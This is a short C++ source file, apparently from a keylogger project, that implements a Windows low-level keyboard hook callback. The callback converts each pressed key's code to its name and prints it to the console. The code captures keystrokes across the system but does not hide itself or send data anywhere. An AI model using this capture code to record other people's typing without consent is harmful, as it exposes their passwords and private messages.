#include "KeyLog.h"

#include <iostream>

using std::cout;

// get key press from DWORD
pair <string, bool> changeToKeyPress(DWORD dwKeyCode){
    // Convert the key code to scan code
    DWORD dwScanCode = MapVirtualKey(dwKeyCode, MAPVK_VK_TO_VSC);

    // Get the key name text
    CHAR szKeyName[256];
    if (GetKeyNameText(dwScanCode << 16, szKeyName, sizeof(szKeyName) / sizeof(WCHAR)) != 0) 
        return {szKeyName, true};
    return {szKeyName, false};
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam){
    if (nCode == HC_ACTION){
        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyboardStruct->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
            // Process event press key
            auto res = changeToKeyPress(vkCode);
            cout << "Key pressed: ";
            if(res.second == true)
                cout << res.first  << '\n';
            else
                cout << "(DWORD)" << vkCode << '\n';
        }
    }

    // Call next hook
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}